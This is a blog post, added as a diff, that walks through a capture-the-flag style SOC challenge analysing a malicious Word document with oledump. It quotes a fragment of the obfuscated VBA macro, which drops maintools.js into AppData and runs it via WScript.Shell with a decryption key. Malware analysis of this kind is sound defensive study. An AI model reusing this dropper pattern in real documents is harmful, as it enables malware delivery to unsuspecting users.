@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <title>Obfuscated</title><!-- Begin Jekyll SEO tag v2.7.1 -->
+<meta name="generator" content="Jekyll v3.9.5" />
+<meta property="og:title" content="Obfuscated" />
+<meta name="author" content="Fpil" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="In this challenge we are dealing with malicious doc file so probably we will be dealing with some VBA scripts. But let’s not get ahead of ourselves." />
+<meta property="og:description" content="In this challenge we are dealing with malicious doc file so probably we will be dealing with some VBA scripts. But let’s not get ahead of ourselves." />
+<link rel="canonical" href="http://localhost:4000/obfuscated.html" />
+<meta property="og:url" content="http://localhost:4000/obfuscated.html" />
+<meta property="og:site_name" content="FpilB blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-12-25T00:00:00+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Obfuscated" />
+<script type="application/ld+json">
+{"url":"http://localhost:4000/obfuscated.html","headline":"Obfuscated","dateModified":"2024-12-25T00:00:00+01:00","datePublished":"2024-12-25T00:00:00+01:00","author":{"@type":"Person","name":"Fpil"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/obfuscated.html"},"@type":"BlogPosting","description":"In this challenge we are dealing with malicious doc file so probably we will be dealing with some VBA scripts. But let’s not get ahead of ourselves.","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="FpilB blog" /><link rel="shortcut icon" type="image/x-icon" href="" />
+  <link rel="stylesheet" href="/assets/css/main.css" />
+</head><body a="light">
+    <main class="page-content" aria-label="Content">
+      <div class="w">
+        <a href="/">..</a><article>
+  <p class="post-meta">
+    <time datetime="2024-12-25 00:00:00 +0100">2024-12-25</time>
+  </p>
+  
+  <h1>Obfuscated</h1>
+
+  <p>In this challenge we are dealing with malicious doc file so probably we will be dealing with some VBA scripts. But let’s not get ahead of ourselves.</p>
+
+<p>The assignment is as follows:
+During your shift as a SOC analyst, the enterprise EDR alerted a suspicious behavior from an end-user machine. The user indicated that he received a recent email with a DOC file from an unknown sender and passed the document for you to analyze.</p>
+
+<p>First question is about hashing so we will skip that one</p>
+
+<h3 id="table-of-contents">Table of contents</h3>
+<ul>
+  <li><a href="#macros-in-streams">Macros in stream</a></li>
+  <li><a href="#ole-streams-and-embedded-vba-macros">OLE streams and embedded VBA macros</a></li>
+  <li><a href="#contents-of-the-vba-script">Contents of the VBA script</a></li>
+  <li><a href="#maintoolsjs">Maintools.js</a></li>
+</ul>
+
+<h3 id="macros-in-streams">Macros in streams</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Q: Multiple streams contain macros in this document. Provide the number of lowest one.
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  1:       114 '\x01CompObj'
+  2:       284 '\x05DocumentSummaryInformation'
+  3:       392 '\x05SummaryInformation'
+  4:      8017 '1Table'
+  5:      4096 'Data'
+  6:       483 'Macros/PROJECT'
+  7:        65 'Macros/PROJECTwm'
+  8: M    7117 'Macros/VBA/Module1'
+  9: m    1104 'Macros/VBA/ThisDocument'
+ 10:      3467 'Macros/VBA/_VBA_PROJECT'
+ 11:      2964 'Macros/VBA/__SRP_0'
+ 12:       195 'Macros/VBA/__SRP_1'
+ 13:      2717 'Macros/VBA/__SRP_2'
+ 14:       290 'Macros/VBA/__SRP_3'
+ 15:       565 'Macros/VBA/dir'
+ 16:        76 'ObjectPool/_1541577328/\x01CompObj'
+ 17: O   20301 'ObjectPool/_1541577328/\x01Ole10Native'
+ 18:      5000 'ObjectPool/_1541577328/\x03EPRINT'
+ 19:         6 'ObjectPool/_1541577328/\x03ObjInfo'
+ 20:    133755 'WordDocument'
+</code></pre></div></div>
+
+<p>To see all macros in the ole streams we can simply use <code class="language-plaintext highlighter-rouge">Oledump</code> which enables us to quickly discover possible culprits in our investigation thanks to the indicators next to the stream number. I have provided an overview of all possible indicators bellow:</p>
+
+<ul>
+  <li>M: Macro (attributes and code)</li>
+  <li>m: macro (attributes without code)</li>
+  <li>E: Error (code that throws an error when decompressed)</li>
+  <li>!: Unusual macro (code without attributes)</li>
+  <li>O: object (embedded file)</li>
+  <li>.: storage</li>
+  <li>R: root entry</li>
+</ul>
+
+<p>So for our use case we will take a closer look at stream #8 - since it contains a macro with attributes and code.</p>
+
+<hr />
+<h4 id="ole-streams-and-embedded-vba-macros">OLE streams and embedded VBA macros</h4>
+
+<p>You can skip this part if you are only interested in the challenge. But I try to  look at these challenges in slightly different light and if something interests me I try and dig little deeper</p>
+
+<p>You might or might not heard about OLE files but in essence :</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>An OLE file can be seen as a mini file system or a Zip archive: It contains streams of data that look like files embedded within the OLE file. Each stream has a name. For example, the main stream of a MS Word document containing its text is named “WordDocument”.
+
+An OLE file can also contain storages. A storage is a folder that contains streams or other storages. For example, a MS Word document with VBA macros has a storage called “Macros”.
+
+Special streams can contain properties. A property is a specific value that can be used to store information such as the metadata of a document (title, author, creation date, etc).
+</code></pre></div></div>
+<p><a href="https://olefile.readthedocs.io/en/latest/OLE_Overview.html">About the structure of OLE files</a></p>
+
+<p>With this info we can basically unzip the evil doc as if it were regular zip file. If we decide to do so we are able to navigate the file structure and find the suspicious stream <code class="language-plaintext highlighter-rouge">Module1</code></p>
+
+<p>If we just try to open the file with text editor we might see some text but certainly it is not readable - we have to decompress it  ( i found that maybe some older formats such as .doc may use LZ77 compression algorithm - but I’m not certain so maybe someone can share some insight )</p>
+
+<p>I took a look at source code of <code class="language-plaintext highlighter-rouge">oledump</code>  and found following functions - that to my knowledge are responsible for the decompression</p>
+
+<p><a href="https://github.com/DidierStevens/DidierStevensSuite/blob/master/oledump.py">OleDump-source</a></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def DecompressChunk(compressedChunk):
+    if len(compressedChunk) &lt; 2:
+        return None, None
+    header = P23Ord(compressedChunk[0]) + P23Ord(compressedChunk[1]) * 0x100
+    size = (header &amp; 0x0FFF) + 3
+    flagCompressed = header &amp; 0x8000
+    data = compressedChunk[2:2 + size - 2]
+
+    if flagCompressed == 0:
+        return data.decode(errors='ignore'), compressedChunk[size:]
+
+    decompressedChunk = ''
+    while len(data) != 0:
+        tokens, data = ParseTokenSequence(data)
+        for token in tokens:
+            if type(token) == int:
+                decompressedChunk += chr(token)
+            elif len(token) == 1:
+                decompressedChunk += token
+            else:
+                if decompressedChunk == '':
+                    return None, None
+                numberOfOffsetBits = OffsetBits(decompressedChunk)
+                copyToken = P23Ord(token[0]) + P23Ord(token[1]) * 0x100
+                offset = 1 + (copyToken &gt;&gt; (16 - numberOfOffsetBits))
+                length = 3 + (((copyToken &lt;&lt; numberOfOffsetBits) &amp; 0xFFFF) &gt;&gt; numberOfOffsetBits)
+                copy = decompressedChunk[-offset:]
+                copy = copy[0:length]
+                lengthCopy = len(copy)
+                while length &gt; lengthCopy: #a#
+                    if length - lengthCopy &gt;= lengthCopy:
+                        copy += copy[0:lengthCopy]
+                        length -= lengthCopy
+                    else:
+                        copy += copy[0:length - lengthCopy]
+                        length -= length - lengthCopy
+                decompressedChunk += copy
+    return decompressedChunk, compressedChunk[size:]
+
+def Decompress(compressedData, replace=True):
+    if P23Ord(compressedData[0]) != 1:
+        return (False, None)
+    remainder = compressedData[1:]
+    decompressed = ''
+    while len(remainder) != 0:
+        decompressedChunk, remainder = DecompressChunk(remainder)
+        if decompressedChunk == None:
+            return (False, decompressed)
+        decompressed += decompressedChunk
+    if replace:
+        return (True, decompressed.replace('\r\n', '\n'))
+    else:
+        return (True, decompressed)
+</code></pre></div></div>
+<hr />
+<h3 id="contents-of-the-vba-script">Contents of the VBA script</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Q: What is the decryption key of the obfuscated code?
+</code></pre></div></div>
+
+<p>If we want to see the contents of the VBA script we have to decompress it first. 
+The decompression can be done with <code class="language-plaintext highlighter-rouge">oledump</code></p>
+
+<ul>
+  <li>we might read the streams directly and then decompress it  with :</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">oledump 49b367ac261a722a7c2bbbc328c32545 -s 8 -v</code></p>
+
+<ul>
+  <li>or ( if we unzipped the file ) navigate to the Module1 and  read it with <code class="language-plaintext highlighter-rouge">-r</code> (raw)  and <code class="language-plaintext highlighter-rouge">-v</code> (vbadecompress) :</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">oledump -r C:\Users\xd\Desktop\cyberdefenders\76-Obfuscated\49b367ac261a722a7c2bbbc328c32545~\Macros\VBA\Module1 -v</code></p>
+
+<p>Both produce the same output - obfuscated code.</p>
+
+<p>Snippet bellow gives us a glimpse into what we are dealing with :</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>B8qen2T433Ds1bW = Environ("appdata") &amp; "\Microsoft\Windows"
+Set R7Ks7ug4hRR2weOy7 = CreateObject("Scripting.FileSystemObject")
+If Not R7Ks7ug4hRR2weOy7.FolderExists(B8qen2T433Ds1bW) Then
+B8qen2T433Ds1bW = Environ("appdata")
+End If
+Set R7Ks7ug4hRR2weOy7 = Nothing
+Dim K764B5Ph46Vh
+K764B5Ph46Vh = FreeFile
+OBKHLrC3vEDjVL = B8qen2T433Ds1bW &amp; "\" &amp; "maintools.js"
+Open (OBKHLrC3vEDjVL) For Binary As #K764B5Ph46Vh
+Put #K764B5Ph46Vh, 1, Wk4o3X7x1134j
+Close #K764B5Ph46Vh
+Erase Wk4o3X7x1134j
+Set R66BpJMgxXBo2h = CreateObject("WScript.Shell")
+R66BpJMgxXBo2h.Run """" + OBKHLrC3vEDjVL + """" + " EzZETcSXyKAdF_e5I2i1"
+ActiveDocument.Save
+Exit Sub
+MnOWqnnpKXfRO:
+Close #K764B5Ph46Vh
+ActiveDocument.Save
+End Sub
+
+</code></pre></div></div>
+
+<p>You might have noticed some interesting variables / functions such as :</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">OBKHLrC3vEDjVL</code> - Full path to maintools.js</li>
+  <li><code class="language-plaintext highlighter-rouge">R66BpJMgxXBo2h</code> - WHS</li>
+</ul>
+
+<p>Especially the last one <code class="language-plaintext highlighter-rouge">R66BpJMgxXBo2h</code> that creates WHS that is then used to run <code class="language-plaintext highlighter-rouge">OBKHLrC3vEDjVL</code> ( maintools.js) with decryption key <code class="language-plaintext highlighter-rouge">EzZETcSXyKAdF_e5I2i1</code></p>
+
+<hr />
+<h3 id="maintoolsjs">maintools.js</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Q: This script uses what language? 
+</code></pre></div></div>
+
+<p>This is one is strange to be completely honest because the extension is <code class="language-plaintext highlighter-rouge">.js</code> which as you suspect is JavaScript - but apparently it can also be JScript.</p>
+
+
+</article>
+      </div>
+    </main>
+  </body>
+</html>
